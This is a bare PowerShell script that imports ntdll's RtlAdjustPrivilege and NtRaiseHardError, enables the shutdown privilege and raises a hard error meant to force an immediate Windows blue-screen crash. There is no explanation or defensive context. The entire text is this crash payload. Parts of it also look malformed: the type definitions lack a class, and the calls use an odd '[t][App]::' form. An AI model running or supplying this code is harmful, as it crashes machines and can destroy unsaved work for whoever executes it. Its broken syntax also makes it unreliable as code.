$t1 = $null
$t2 = $null

$signature_RtlAdjustPrivilege = @"
[DllImport("ntdll.dll")]
public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
"@

$signature_NtRaiseHardError = @"
[DllImport("ntdll.dll")]
public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
"@

Add-Type -TypeDefinition $signature_RtlAdjustPrivilege
Add-Type -TypeDefinition $signature_NtRaiseHardError

[t][App]::RtlAdjustPrivilege(19, $true, $false, [ref]$t1)
[t][App]::NtRaiseHardError(0xc0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$t2)
